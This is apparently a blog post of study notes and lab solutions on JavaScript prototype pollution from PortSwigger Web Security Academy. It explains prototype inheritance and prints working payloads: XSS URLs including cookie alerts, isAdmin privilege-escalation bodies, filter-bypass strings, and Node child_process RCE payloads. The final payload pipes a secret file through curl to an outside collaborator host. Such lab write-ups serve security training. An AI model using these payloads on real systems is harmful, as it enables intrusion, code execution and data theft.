---
title: Portswigger (Prototype Pollution)
date: 2026-8-12 13:10:30 +0000
categories: [Portswigger]
tags: [Portswigger]
math: true
mermaid: true
media_subpath: /assets/posts/portswigger
image:
  path: preview.png
---
--------------
-----------------

#### Prototype Pollution

-----------------

- Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects
- Although, prototype pollution is meant to be chained as a gadget with another vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

------------------

### Prototype and Inheritance in Javascript

------------------

- Javascript uses a prototypal-inheritance model compared to class-model used by other programming languages.
- Objects in js-:It consist of `key:value` pair known as properties.e.g

```js
const user = {name: "Andrew",age: 15,role: "admin"};
```

- Access it via bracket notation or dot notation-:

```js
user.name //Andrew
user['name'] //Andrew
```

- As well as data, properties may also contain executable functions. In this case, the function is known as a "method".

```js
const user = {name: "Andrew",age: 15,role: "admin",isAdmin: function() {if (this.role === 'admin'){ return true; } else {return false;}}};
```

- The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values. However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals.

---------------

### Prototype in Javascript

---------------

- Every object in JavaScript is linked to another object of some kind, known as its prototype. By default, JavaScript automatically assigns new objects one of its built-in prototypes. For example, strings are automatically assigned the built-in String.prototype.
- For example-:

```js
let myString = "";
Object.getPrototypeOf(myString); //String
```

- Inheritance way of life in Javascript-: When javascript tries to check a property for an object, it checks if it exists in the object but if it is non-existent, it checks the object's prototype.
- The prototype chain-: Note that an object's prototype is just another object, which should also have its own prototype, and so on. As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level Object.prototype, whose prototype is simply null.

<img width="838" height="472" alt="image" src="https://github.com/user-attachments/assets/4cfcd0de-8e97-453a-a658-d2e3f5ad89f1" />

- Crucially, objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain. In the example above, this means that the username object has access to the properties and methods of both String.prototype and Object.prototype.


---------------

### Accessing an object's prototype using `__proto__`

----------------

- Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers. If you're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary.As with any property, you can access __proto__ using either bracket or dot notation:

```js
let username = "sensei";
username.__proto__; //String.prototype
username.__proto__.__proto__; //Objeect.prototype
username.__proto__.__proto__.__proto__; //null
```

- Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations.

----------------

### How the vulnerabiity arises

----------------

- It occurs a javascript function recursively merges object controllable user input into an existing object without sanitizing the key.This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties.The merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
- It is possible to pollute an object but with theh `Object.prototype`.
- Key Components-:
  - A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
  - A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
  - An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

-------------- 

### Components

---------------

- A prototype pollution source is any input that enables you to poison prototype objects with arbitrary properties.
  - The URL via either the query or fragment string (hash)
  - JSON-based input
  - Web messages
 
- Pollution via url-: Example

```url
https://loclahost:5000/?__proto__[evilSink]=payload
```

- You might think that the __proto__ property, along with its nested evilProperty, will just be added to the target object as follows:-:

```js
{__proto__:{evilSink: 'payload' } }
```

- But it'll be like this

```js
targetObject.__proto__.evilSink = payload;
```

- During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.
- In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.

- Prototype pollution via JSON input-:
  - User-controllable objects are often derived from a JSON string using the JSON.parse() method. Interestingly, JSON.parse() also treats any key in the JSON object as an arbitrary string, including things like __proto__. This provides another potential vector for prototype pollution.
  - Malicious JSON-:
  ```json
  {
    "__proto__": {
        "evilProperty": "payload"
    }
  }
  ```
  - If this is converted into a JavaScript object via the JSON.parse() method, the resulting object will in fact have a property with the key __proto__:
  ```js
  const objectLiteral = {__proto__: {evilProperty: 'payload'}};
  const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

  objectLiteral.hasOwnProperty('__proto__');     // false
  objectFromJson.hasOwnProperty('__proto__');    // true
  ```
  - If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example.

- A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.
- An exploitable gadget-: A gadget is a way of turning it into an exploit e.g
  - Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
  - Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

- Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

```js
let transport_url = config.transport_url || defaults.transport_url;
```
- Now imagine the library code uses this transport_url to add a script reference to the page:

```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

- If the website's developers haven't set a transport_url property on their config object, this is a potential gadget. In cases where an attacker is able to pollute the global Object.prototype with their own transport_url property, this will be inherited by the config object and, therefore, set as the src for this script to a domain of the attacker's choosing.
- If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:

```js
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

- By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows:

```js
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
- Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.

---------------

### Client Side Prototype Pollution

--------------

- First Challenge-:

```url
https://0a94002a0497549a803b037c00ac00cc.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);//
```
 - Sink/gadget(transport_url ain't defined)-:
```js
let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```
- Pollution source in deparam-:

```js
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
            keys = keys.shift().split('[').concat( keys );
            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[key].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[key] = [ obj[key], val ];
                } else {
                    obj[key] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```
- 2nd Challenge(DOM XSS via an alternative prototype pollution vector)-:

```url
https://0a5b009003c8944f805d03a9008e00c1.web-security-academy.net/?__proto__.sequence=%27z%27);alert(1)}%20//
```

- Pollution source-: It has a unique way of parsing url params for setting key and value.e,g

```js
__proto__[sequence]=payload
__proto__.sequence=payload
```

- Source code tidbits-:

```js
// Add an URL parser to JQuery that returns an object
// This function is meant to be used with an URL like the window.location
// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
// Simple variable:  ?var=abc                        returns {var: "abc"}
// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
```

- Gadget(window.manager.sequence)-:

```js
window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

```

- Sink to hit xss-:

```js
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

```

-------------

### Lab-: Client-side prototype pollution via flawed sanitization

--------------

- The js file replaces '__proto__' with empty space ,you can bypass with this `__prot__proto__o__`.Url-:

```
https://0a97007804f29e4e818f84e7005d005f.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1);//
```
- Another way to write `__proto__` is `constructor.prototype`.

```js
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```


--------------

### Using DOM Invader to identify prototype pollution in third party libraries

---------------

- Solution-:

```html
<meta name="referrer" content="never">
<script>
location="https://0a62000303cbd84f8051f313000400dd.web-security-academy.net/chat?constructor[prototype][hitCallback]=alert(document.cookie)&constructor.prototype.hitCallback=alert(document.cookie)&__proto__.hitCallback=alert(document.cookie)&__proto__[hitCallback]=alert(document.cookie)&constrconstructoructor[prototype][hitCallback]=alert(document.cookie)&constrconstructoructor.prototype.hitCallback=alert(document.cookie)&__pro__proto__to__.hitCallback=alert(document.cookie)&__pro__proto__to__[hitCallback]=alert(document.cookie)#constructor[prototype][hitCallback]=alert(document.cookie)&constructor.prototype.hitCallback=alert(document.cookie)&__proto__.hitCallback=alert(document.cookie)&__proto__[hitCallback]=alert(document.cookie)&constrconstructoructor[prototype][hitCallback]=alert(document.cookie)&constrconstructoructor.prototype.hitCallback=alert(document.cookie)&__pro__proto__to__.hitCallback=alert(document.cookie)&__pro__proto__to__[hitCallback]=alert(document.cookie)"
</script>
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```

----------------

### Prototype Pollution Browser APIS

-----------------

- Exploiting `fetch()`-: The Fetch API provides a simple way for developers to trigger HTTP requests using JavaScript. The fetch() method accepts two arguments:The URL to which you want to send the request.An options object that lets you to control parts of the request, such as the method, headers, body parameters, and so on.
- Making a normal `POST` request-:

```js
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```
- As you can see, we've explicitly defined method and body properties, but there are a number of other possible properties that we've left undefined. In this case, if an attacker can find a suitable source, they could potentially pollute Object.prototype with their own headers property. This may then be inherited by the options object passed into fetch() and subsequently used to generate the request.
- Vulnerable code-:

```js
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```
- To exploit this, an attacker could pollute Object.prototype with a headers property containing a malicious x-username header as follows:

```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

- Prototype pollution via `Object.defineProperty()`
- Developers with some knowledge of prototype pollution may attempt to block potential gadgets by using the Object.defineProperty() method. This enables you to set a non-configurable, non-writable property directly on the affected object as follows:
```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```
- This may initially seem like a reasonable mitigation attempt as this prevents the vulnerable object from inheriting a malicious version of the gadget property via the prototype chain. However, this approach is inherently flawed.Just like the fetch() method we looked at earlier, Object.defineProperty() accepts an options object, known as a "descriptor". You can see this in the example above. Among other things, developers can use this descriptor object to set an initial value for the property that's being defined. However, if the only reason that they're defining this property is to protect against prototype pollution, they might not bother setting a value at all.In this case, an attacker may be able to bypass this defense by polluting Object.prototype with a malicious value property. If this is inherited by the descriptor object passed to Object.defineProperty(), the attacker-controlled value may be assigned to the gadget property after all.

- Solving the challenge-:Url

```
https://0a0800be0322ce61805912f8004f00fe.web-security-academy.net/?__proto__[value]=data:,alert(1);//
```

- I checked [mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty) for how `Object.defineProperty()` works.It takes in argument `descriptor` which is an object requiring values passed into keys `value`,`configurable` and `writable`.`Value` allows us to set the defined value of an object's property.If not set, it can lead to prototype pollution and allow an attacker set `value` at `Object.prototype`.Gadget-:

```js
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false}); //value key is not set
```

-----------------

### Server-side Prototype Pollution

-----------------

- Detecting server-side prototype pollution via polluted property reflection

- An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.E.g
  
<img width="1072" height="456" alt="image" src="https://github.com/user-attachments/assets/5b2064f4-e867-4234-812c-ac3c27ba4b48" />

- This also applies to arrays, where a for...in loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well.

<img width="1049" height="356" alt="image" src="https://github.com/user-attachments/assets/debf59e1-cb7b-4ff9-a65d-b6a301e8edb5" />

- Lab-: Privilege Escalation with Server-Side pollution-:
- Solution-:

```http
POST /my-account/change-address HTTP/2
Host: 0a80008a04aab2458188702000950037.web-security-academy.net
Cookie: session=RpBd2708AlwcHGnQTiusLdpPJW5z02B1
Content-Length: 168
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Brave";v="140"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Gpc: 1
Accept-Language: en-US,en;q=0.8
Origin: https://0a80008a04aab2458188702000950037.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a80008a04aab2458188702000950037.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"RpBd2708AlwcHGnQTiusLdpPJW5z02B1","__proto__":{"isAdmin":true}}
```

-----------------

### Detecting server-side prototype pollution without polluted property reflection

-----------------

- Installing Iconv for utf-7 encoding-:

```zsh
wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.11.tar.gz
tar -xvf libiconv-1.11.tar.gz
cd libiconv-1.11
./configure --prefix=/usr/local/iconv
```

<img width="1901" height="154" alt="image" src="https://github.com/user-attachments/assets/a5430512-7648-473d-af58-f857477efafa" />

- Most times the result of a prototype pollution attack doesn't get reflected due to the fact that it is not client side.One approach is to try injecting properties that match potential configuration options for the server. You can then compare the server's behavior before and after the injection to see whether this configuration change appears to have taken effect. If so, this is a strong indication that you've successfully found a server-side prototype pollution vulnerability.
- Techniques-:

```
Status code override
JSON spaces override
Charset override
```

- Status code override-: Server-side JavaScript frameworks like Express allow developers to set custom HTTP response statuses. In the case of errors, a JavaScript server may issue a generic HTTP response, but include an error object in JSON format in the body. This is one way of providing additional details about why an error occurred, which may not be obvious from the default HTTP status.Although it's somewhat misleading, it's even fairly common to receive a 200 OK response, only for the response body to contain an error object with a different status.

```json
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

-  Node's http-errors module contains the following function for generating this kind of error response:

```js
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

- The line below tries to read `status` and `statusCode` from object `err` and if it is not explicitly stated by the developer.The properties can be polluted.Try polluting the prototype with your own status property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.

```js
 status = err.status || err.statusCode || status
```

- JSON Spaces Override-: he Express framework provides a `json spaces` option, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined as they're happy with the default value, making it susceptible to pollution via the prototype chain.If you've got access to any kind of JSON response, you can try polluting the prototype with your own json `spaces` property, then reissue the relevant request to see if the indentation in the JSON increases accordingly. You can perform the same steps to remove the indentation in order to confirm the vulnerability.This is an especially useful technique because it doesn't rely on a specific property being reflected. It's also extremely safe as you're effectively able to turn the pollution on and off simply by resetting the property to the same value as the default.Although the prototype pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be vulnerable.
- Always set the reponse tab to `raw` to identify it

- Charset override-: Middleware like `body-parser` that preprocess request sbefore they're passed to the appropriate handler function. For example, the body-parser module is commonly used to parse the body of incoming requests in order to generate a req.body object. This contains another gadget that you can use to probe for server-side prototype pollution.Notice that the following code passes an options object into the read() function, which is used to read in the request body for parsing. One of these options, encoding, determines which character encoding to use. This is either derived from the request itself via the getCharset(req) function call, or it defaults to UTF-8.

```js
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```
- Polluting the `charset` attribute will be possible through `content-type` properties

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
- Due to a bug in Node's _http_incoming module, this works even when the request's actual Content-Type header includes its own charset attribute. To avoid overwriting properties when a request contains duplicate headers, the _addHeaderLine() function checks that no property already exists with the same key before transferring properties to an IncomingMessage object

```js
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```
If it does, the header being processed is effectively dropped. Due to the way this is implemented, this check (presumably unintentionally) includes properties inherited via the prototype chain. This means that if we pollute the prototype with our own content-type property, the property representing the real Content-Type header from the request is dropped at this point, along with the intended value derived from the header.

- Lab-: Detecting server-side prototype pollution without polluted property reflection
- Solution by tweaking `json spaces`-:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "in1gBgf219ibnRiQgX2TWBVjrK808olK",
  "__proto__": {
    "json spaces": 3
  }
}
```

- Tweaking body-parser:`content-type`

```json
{
  "address_line_1": "+AEgAZQBsAGwAbwAgACgAIABXAG8AcgBsAGQAIQAg5L2g5aW9ACAA8J+Mjw-",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "ZH3bo0oZfag2nB6Una1u5xNt4qtS9bEo",
  "_proto__": {
    "content-type": "application/json;charset=UTF-7"
  }
}
```

----------------

### Bypassing filters

-----------------

- Replacing filter common bypass-:

```
__pro__proto__to__
consconstructortructor.proprototypetotype
```

- Lab bypass with `constructor.prototype`

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "aXi5nNBtlbVU0fVoKld6V7B4lVfH0jpO",
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```
- Proof-:

<img width="1501" height="749" alt="image" src="https://github.com/user-attachments/assets/a759ea1c-ef7d-4552-94c7-248ecad92438" />


----------------

### Remote COde Execution

----------------

- Lastly, prototype pollution leads to nodejs RCE  in relation to server side unlike DOM XSS on client side.
- It can occur in the `child_process` module which can be detected with Burp collaborator.The NODE_OPTIONS environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the env object, you can potentially control this via prototype pollution if it is undefined.Some of Node's functions for creating new child processes accept an optional shell property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious `NODE_OPTIONS` property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created:

```json
{
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
}
```
- Remote code execution with `child_process.fork()` and `child_process.spawn()`-:
- Methods such as child_process.spawn() and child_process.fork() enable developers to create new Node subprocesses. The fork() method accepts an options object in which one of the potential options is the execArgv property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.
- As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using NODE_OPTIONS. Of particular interest is the --eval argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment:

```json
"execArgv": [
    "--eval=require('<module>')"
]
```

- It also applies to `child_process.spawn()`
- Lab [child_process's docs](https://nodejs.org/api/child_process.html)-:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "9hBiJF55gLMXiljYtkhTWhYIpTRFl4VQ",
  "constructor": {
    "prototype": {
      "execArgv": [
        "--eval=require(node:child_process).spawn(rm,[/home/carlos/morale.txt])"
      ]
    }
  }
}
```


----------------

### Remote code execution via child_process.execSync()

----------------

- Just like `fork()` which accepts the `execArgv`, `execSync` accepts the options argument which can be polluted.Image's sauce is from the documentation

<img width="813" height="576" alt="image" src="https://github.com/user-attachments/assets/479ab773-5b4f-4362-83c2-25edd91db428" />

- Although this doesn't accept an execArgv property, you can still inject system commands into a running child process by simultaneously polluting both the shell and input properties-:

   - The input option is just a string that is passed to the child process's stdin stream and executed as a system command by execSync(). As there are other options for providing the command, such as simply passing it as an argument to the function, the input property itself may be left undefined.
   - The shell option lets developers declare a specific shell in which they want the command to run. By default, execSync() uses the system's default shell to run commands, so this may also be left undefined.
-  By polluting both of these properties, you may be able to override the command that the application's developers intended to execute and instead run a malicious command in a shell of your choosing.Although there are exceptions-:
 
 -  The shell option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.
 -  The shell is always executed with the -c argument, which most shells use to let you pass in a command as a string. However, setting the -c flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.
 -  As the input property containing your payload is passed via stdin, the shell you choose must accept commands from stdin.

- Example-:

```
"shell":"vim",
"input":":! <command>\n"
```

- Lab(Solved by using 'vim ":!sh -c ''")-:

```json
{
  "constructor": {
    "prototype": {
      "shell": "vim",
      "input": ":! sh -c cat /home/carlos/secret | curl z993grzca1i7deezwsccp9qvcmid6gu5.oastify.com/ -d @- \n"
    }
  }
}
```
----------------
